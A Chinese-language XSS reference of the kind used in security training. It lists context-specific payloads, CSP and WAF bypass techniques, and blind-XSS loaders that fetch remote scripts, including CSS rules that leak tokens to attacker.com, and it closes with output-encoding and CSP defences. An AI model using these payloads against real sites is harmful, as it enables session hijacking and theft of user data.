---
attack_surface: [注入类, 客户端利用]
impact: [信息泄露, 会话劫持, 身份伪造, 远程代码执行(客户端)]
risk_level: 严重
prerequisites:
  - HTML/CSS/JavaScript 基础
  - 浏览器同源策略与 DOM 解析
  - HTTP 协议基础
difficulty: 初级
related_techniques:
  - csti-client-side-template-injection
  - dangling-markup
  - crlf-injection
  - open-redirect
  - csrf-cross-site-request-forgery
  - csp-bypass
  - xs-leaks
tools:
  - Burp Suite
  - XSStrike
  - dalfox
  - kxss
  - xsstools
  - 浏览器 DevTools
---

# XSS (Cross-Site Scripting) — 跨站脚本攻击

> 关联文档：[CSTI](../Client%20Side%20Template%20Injection/README.md) · [Dangling Markup](../Dangling%20Markup/README.md) · [CRLF](../CRLF/README.md) · [Open Redirect](../Open%20Redirect/README.md) · [XSSI](../XSSI/README.md) · [XS-Search](../XS-Search/README.md)

---

# 0x01 背景与原理

## 1.1 定义

XSS (Cross-Site Scripting) 是指攻击者将**恶意脚本注入**到目标网站，使其在受害者浏览器中执行。本质是**用户输入被当作代码执行**——浏览器无法区分"来自应用的合法脚本"和"攻击者注入的恶意脚本"。

## 1.2 攻击前提

| 条件 | 说明 |
|------|------|
| **注入点** | 用户可控输入被反射或存储到页面中 |
| **未充分过滤** | 特殊字符 (`<`, `>`, `"`, `'`, `` ` ``, `&`) 未被编码 |
| **浏览器解析** | 注入内容被浏览器按 HTML/JS/CSS 上下文解析执行 |

## 1.3 同源策略与 XSS 危害

XSS 之所以危险，是因为恶意脚本在**目标域的安全上下文**中执行，可访问：

- `document.cookie`（若未设置 HttpOnly）
- `localStorage` / `sessionStorage`
- DOM 内容（CSRF token、表单数据）
- 浏览器自动填充的凭证
- 摄像头/麦克风（经用户授权后）

---

# 0x02 分类体系

## 2.1 按持久性分类

| 类型 | 持久性 | 触发机制 | 典型注入点 |
|------|--------|----------|-----------|
| **Reflected XSS** | 无 | 用户点击恶意链接，参数立即反射到响应 | URL 参数、搜索框、错误消息 |
| **Stored XSS** | 永久 | 每次访问页面自动触发 | 评论、个人资料、消息、富文本 |
| **DOM-based XSS** | 无 | JS 不安全处理 URL 片段/DOM 数据 | `innerHTML`, `document.write`, `eval()` |
| **Blind XSS** | 永久 | 后台管理员查看时触发 | 反馈表单、日志系统、工单系统 |

## 2.2 Reflected XSS 深度分析

**攻击链**：
```
攻击者构造恶意URL → 诱骗受害者点击 → 请求发送到目标 → 
参数反射至响应HTML → 浏览器解析执行恶意脚本 → 窃取Cookie/Token
```

**常见反射点**：
```html
<!-- 搜索框反射 -->
/search?q=<script>alert(1)</script>

<!-- 错误消息反射 -->
/login?error=<img src=x onerror=alert(1)>

<!-- 重定向参数反射 -->
/redirect?url=javascript:alert(1)
```

## 2.3 Stored XSS 深度分析

**高危场景**：
- 富文本编辑器（CKEditor、TinyMCE）
- Markdown 渲染器（若未正确过滤 HTML）
- SVG 文件上传（SVG 可内嵌 `<script>`）
- 用户个人资料（姓名、签名档）

**SVG 文件上传 Stored XSS 示例**：
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
  <circle cx="50" cy="50" r="40" fill="red" />
</svg>
```

## 2.4 DOM-based XSS — Source & Sink 模型

| Source（污染源） | Sink（执行点） |
|-----------------|---------------|
| `location.search` | `innerHTML` |
| `location.hash` | `document.write()` |
| `document.referrer` | `eval()` |
| `postMessage` 数据 | `setTimeout()` / `setInterval()` |
| `localStorage` 值 | `new Function()` |
| `document.cookie` | `window.open()` `location` |

**DOM XSS 检测 Payload**：
```javascript
// 检测常见 sink
location.search  →  ?x="-alert(1)-"
location.hash    →  #-alert(1)-
postMessage      →  postMessage("alert(1)", "*")
```

## 2.5 Blind XSS — 无回显场景

**典型场景**：
- 用户反馈表单 → 管理员后台查看
- 日志聚合系统（ELK、Splunk）
- 客服聊天系统
- 邮件内容（Web 邮件客户端渲染 HTML）

**Blind XSS 专用 Payload (XSSHunter)**：
```html
"><script src="https://<your-subdomain>.xss.ht"></script>
"><img src=x onerror="s=document.createElement('script');s.src='https://<your>.xss.ht'">
```

> **关键技巧**：Blind XSS pingback 不仅返回触发时间，还可携带 `document.domain`、`innerHTML` 片段等上下文信息。

## 2.6 mXSS (Mutation XSS)

**本质是** 浏览器 DOM 序列化→反序列化过程中的解析差异：

```html
<!-- 通过 innerHTML 产生的变异 -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

**高危框架**：
- jQuery `.html()`（旧版未过滤）
- DOMPurify 特定版本（CVE-2020-26870 等）
- Angular `bypassSecurityTrustHtml`

---

# 0x03 上下文分类 Payload 全集

## 3.1 HTML 标签间注入

```html
<!-- 基础 -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>

<!-- 无字母数字绕过 -->
<script>alert(1)</script>  // 被过滤时
<svg><script>&#x61;&#x6c;&#x65;&#x72;&#x74;(1)</script>
```

## 3.2 HTML 属性内注入

```html
<!-- 属性闭合后注入 -->
" autofocus onfocus=alert(1) x="
' onmouseover=alert(1) '

<!-- href 属性 -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>

<!-- src 属性 -->
x onerror=alert(1)
" onerror=alert(1) "
```

## 3.3 JavaScript 上下文注入

```javascript
// 字符串闭合
'; alert(1); //
"-alert(1)-"

// 模板字符串
${alert(1)}

// JSON 上下文注入
{"key": "</script><script>alert(1)</script>"}
```

## 3.4 CSS 上下文注入

```css
/* IE 专有 expression */
background: expression(alert(1))

/* CSS injection → data exfiltration */
input[value^="a"] { background: url(http://attacker.com/?leak=a); }
input[value^="b"] { background: url(http://attacker.com/?leak=b); }
/* ... 逐字符窃取 CSRF token */
```

## 3.5 URL 上下文注入

```
javascript:alert(1)
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
vbscript:msgbox(1)
```

---

# 0x04 CSP 绕过技术矩阵

## 4.1 CSP 头解析

```
Content-Security-Policy: default-src 'self'; 
  script-src 'self' 'nonce-random123'; 
  style-src 'self' 'unsafe-inline';
  img-src *;
  base-uri 'self';
  frame-ancestors 'none'
```

## 4.2 绕过技术分类

| CSP 策略 | 绕过方法 | Payload 示例 |
|----------|---------|-------------|
| `script-src 'self'` | JSONP 端点 | `<script src="/api/jsonp?callback=alert(1)">` |
| `script-src 'nonce-xxx'` | Nonce 泄露 + DOM XSS | 页面中动态脚本未带 nonce |
| `script-src 'strict-dynamic'` | Gadget 链 | 利用已允许的脚本动态创建新 `<script>` |
| `base-uri` 缺失 | `<base>` 劫持 | `<base href="http://attacker.com/">` |
| `object-src` 缺失 | Flash/Java Applet | `<embed src="evil.swf">` |

**JSONP 端点探测**：
```bash
# 常见 JSONP callback 参数
curl -s "https://target.com/api/data?callback=test"
# → test({"data":...})  → JSONP 端点确认
```

## 4.3 Script Gadgets 利用

当 `strict-dynamic` 或 nonce 模式启用时，利用框架内置的 JS Gadget 绕过：

```html
<!-- VueJS gadget (PortSwigger 研究) -->
<div v-html="''.constructor.constructor('alert(1)')()">

<!-- AngularJS gadget -->
<div ng-app ng-csp>
  <input autofocus ng-focus=$event.view.alert(1)>
</div>
```

---

# 0x05 WAF 绕过技术库

## 5.1 编码混淆

| 编码类型 | 示例 |
|---------|------|
| **HTML Entity** | `&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;` |
| **URL 编码** | `%3Cscript%3Ealert(1)%3C/script%3E` |
| **Unicode 编码** | `<script>alert(1)</script>` |
| **Base64** | `<img src=x onerror=eval(atob('YWxlcnQoMSk='))>` |
| **JSFuck** | `[][(![]+[])[+[]]+...]([])()` |
| **双重 URL 编码** | `%253Cscript%253E`（WAF 解码一次，服务器再解码一次） |

## 5.2 标签/事件处理器变异

```html
<!-- 大小写混合 -->
<ScRiPt>alert(1)</sCrIpT>

<!-- 空白字符插入 -->
<img src=x onerror = alert(1) >

<!-- 零宽字符 -->
<script>al​ert(1)</script>

<!-- 事件处理器变异 -->
<svg/onload=alert(1)>
<details/open/ontoggle=alert(1)>
<body/onload=alert(1)>

<!-- HTML5 新标签 -->
<portal src=javascript:alert(1)>
```

## 5.3 协议变异

```
// 无协议 URL（继承当前协议）
<iframe src="//attacker.com/xss">

// 大小写协议
<iframe src="DaTa:text/html,<script>alert(1)</script>">

// HTML 实体 + 协议
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">
```

## 5.4 常见 WAF 绕过模式

```html
<!-- Cloudflare -->
<svg/onload=alert(1)>

<!-- AWS WAF -->
<img src=x onerror=eval(atob('base64payload'))>

<!-- Imperva -->
<details open ontoggle=top.alert(1)>

<!-- Akamai -->
<script>Function('al'+'ert(1)')()</script>
```

---

# 0x06 XSS 漏洞挖掘方法论

## 6.1 自动化检测流程

| 阶段 | 工具/方法 | 输出 |
|------|----------|------|
| **1. 参数发现** | gau, waybackurls, katana, paramspider | 所有带参数的 URL |
| **2. 反射检测** | dalfox, kxss | 反射参数列表 |
| **3. 上下文分析** | Burp Suite + 手动审查 | 注入上下文类型 |
| **4. Payload 生成** | XSStrike, custom fuzz list | 上下文适配 Payload |
| **5. 盲测确认** | XSSHunter, Burp Collaborator | OOB 确认 |

## 6.2 手动探测优先级清单

1. **搜索功能** — 搜索词直接反射（`?q=`, `?search=`, `?keyword=`）
2. **错误消息** — 非法输入是否原样显示错误（`?error=`, `?msg=`）
3. **重定向参数** — 检查 `?redirect=`, `?next=`, `?returnUrl=`
4. **用户注册** — 姓名、用户名是否反射到其他页面
5. **文件上传** — SVG、HTML、MHT 文件类型
6. **JSON/XML API** — Content-Type 切换为 `text/html` 观察响应

## 6.3 浏览器 DevTools 调试技巧

```javascript
// 追踪 DOM XSS source → sink 路径
// 在 source 读取点打入断点
const originalSearch = window.location.search;
// 追踪变量到 sink
debugger;

// 监控 innerHTML 调用
const desc = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
Object.defineProperty(Element.prototype, 'innerHTML', {
  set: function(val) {
    if (val.includes('<')) {
      console.trace('[Potential XSS]', val.slice(0, 100));
    }
    return desc.set.call(this, val);
  }
});
```

---

# 0x07 现代框架 XSS

## 7.1 React XSS

```jsx
// 安全 (自动转义)
<div>{userInput}</div>

// 危险
<div dangerouslySetInnerHTML={{__html: userInput}} />

// 危险 — href 属性
<a href={userInput}>Click</a>  // javascript:alert(1) 仍有效
```

## 7.2 Vue.js XSS

```html
<!-- 安全 -->
<div>{{ userInput }}</div>

<!-- 危险 -->
<div v-html="userInput"></div>
<div :href="userInput"></div>  <!-- javascript: 协议 -->
```

## 7.3 Angular XSS

```typescript
// 安全 (自动消毒)
<div [innerHTML]="userInput"></div>

// 危险 — 绕过消毒器
this.sanitizer.bypassSecurityTrustHtml(userInput);
```

---

# 0x08 攻击链与联动

| 组合攻击 | 链式利用 |
|---------|---------|
| **Open Redirect → XSS** | `?redirect=javascript:alert(1)` |
| **CRLF → XSS** | 注入 `%0d%0a%0d%0a<script>alert(1)</script>` 至响应头 |
| **File Upload → Stored XSS** | 上传 SVG/HTML 文件 |
| **CSPT → XSS** | 路径遍历加载攻击者 JS 文件 |
| **SQLi → Stored XSS** | 通过 SQL 注入修改页面内容 |

---

# 0x09 防御体系

## 9.1 根本性防御

| 层级 | 措施 |
|------|------|
| **输出编码** | 根据上下文选择编码函数：HTML Entity / JS Unicode / URL 编码 |
| **输入验证** | 白名单验证 + 类型检查（而非黑名单过滤） |
| **CSP** | `script-src 'self'` + nonce/hash + `strict-dynamic` |
| **HttpOnly Cookie** | 防止 `document.cookie` 窃取 |
| **Trusted Types** | 强制类型安全 DOM 操作 |

## 9.2 上下文编码速查

| 上下文 | Java | PHP | JavaScript |
|--------|------|-----|------------|
| **HTML 文本** | `StringEscapeUtils.escapeHtml4()` | `htmlspecialchars()` | `textContent` |
| **HTML 属性** | `StringEscapeUtils.escapeHtml4()` | `htmlspecialchars(ENT_QUOTES)` | `setAttribute()` |
| **JavaScript** | `StringEscapeUtils.escapeEcmaScript()` | `json_encode()` | `JSON.stringify()` |
| **URL** | `URLEncoder.encode()` | `urlencode()` | `encodeURIComponent()` |
| **CSS** | — | — | `CSS.escape()` |

---

# 0x0A 工具与资源

## 10.1 自动化工具

| 工具 | 用途 | 特点 |
|------|------|------|
| **XSStrike** | 智能 XSS 检测 | 上下文分析 + 自动 Payload 生成 |
| **dalfox** | 快速参数扫描 | Go 编写，高并发 |
| **kxss** | 反射参数探测 | 极速筛选 |
| **XSSHunter** | Blind XSS 框架 | 自动截图、Cookie 捕获 |

## 10.2 Payload 字典

- [PayloadsAllTheThings — XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [carlospolop XSS 字典](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt)

## 10.3 实战训练

- [PortSwigger XSS Labs](https://portswigger.net/web-security/all-labs#cross-site-scripting)
- [Google XSS Game](https://xss-game.appspot.com/)

## 10.4 关键参考

- [PortSwigger Cross-Site Scripting](https://portswigger.net/web-security/cross-site-scripting)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Trusted Types Specification](https://w3c.github.io/trusted-types/dist/spec/)
